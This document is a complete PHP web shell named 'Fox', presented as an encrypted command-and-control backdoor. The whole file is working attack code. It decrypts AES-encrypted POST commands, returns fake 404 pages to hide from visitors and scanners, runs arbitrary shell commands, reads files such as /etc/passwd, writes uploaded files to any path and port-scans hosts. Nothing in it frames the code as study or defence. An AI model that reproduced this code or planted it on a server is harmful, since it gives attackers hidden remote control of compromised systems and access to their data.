<?php
/*
 * Fox PHP Webshell — AES-256-CBC Encrypted C2 Backdoor
 * ─────────────────────────────────────────────────────
 * Method:  POST with encrypted JSON body
 * Key:     SHA256("fox-c2-key-2026")  (change this)
 * 
 * Commands:
 *   {"cmd":"exec","arg":"id"}         — system command
 *   {"cmd":"file","arg":"/etc/passwd"} — read file
 *   {"cmd":"upload","path":"...","data":"base64..."} — write file
 *   {"cmd":"phpinfo"}                 — phpinfo()
 *   {"cmd":"scan","arg":"127.0.0.1"}  — port scan local
 */

define('FOX_KEY', hex2bin(hash('sha256', 'fox-c2-key-2026')));
define('FOX_IV',  hex2bin(hash('md5', 'fox-c2-iv-2026')));  // 16 bytes for AES-CBC

// Camouflage: respond with 404 if GET or no valid ciphertext
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($HTTP_RAW_POST_DATA)) {
    $input = file_get_contents('php://input');
} else {
    $input = $HTTP_RAW_POST_DATA;
}

if (!$input) {
    http_response_code(404);
    die('404 Not Found');
}

// Decrypt
$payload = @openssl_decrypt(base64_decode($input), 'aes-256-cbc', FOX_KEY, OPENSSL_RAW_DATA, FOX_IV);
if (!$payload) {
    http_response_code(404);
    die('404 Not Found');
}

$data = json_decode($payload, true);
if (!$data || !isset($data['cmd'])) {
    http_response_code(404);
    die('404 Not Found');
}

$cmd = $data['cmd'];
$arg = $data['arg'] ?? '';
$result = [];

switch ($cmd) {
    case 'exec':
        ob_start();
        system($arg, $ret);
        $result['output'] = ob_get_clean();
        $result['retcode'] = $ret;
        break;

    case 'file':
        if (file_exists($arg) && is_readable($arg)) {
            $result['content'] = base64_encode(file_get_contents($arg));
        } else {
            $result['error'] = 'File not found or not readable';
        }
        break;

    case 'upload':
        $path = $data['path'] ?? '';
        $raw  = base64_decode($data['data'] ?? '');
        if ($path && $raw) {
            @mkdir(dirname($path), 0777, true);
            file_put_contents($path, $raw);
            $result['written'] = strlen($raw);
        } else {
            $result['error'] = 'path and data required';
        }
        break;

    case 'phpinfo':
        ob_start();
        phpinfo();
        $result['output'] = ob_get_clean();
        break;

    case 'scan':
        $host = $arg;
        $result['open_ports'] = [];
        for ($port = 1; $port <= 1024; $port++) {
            $sock = @fsockopen($host, $port, $errno, $errstr, 0.3);
            if ($sock) {
                $result['open_ports'][] = $port;
                fclose($sock);
            }
        }
        break;

    default:
        $result['error'] = 'Unknown command: ' . $cmd;
}

// Encrypt response
$output = openssl_encrypt(json_encode($result), 'aes-256-cbc', FOX_KEY, OPENSSL_RAW_DATA, FOX_IV);
header('Content-Type: text/plain');
echo base64_encode($output);
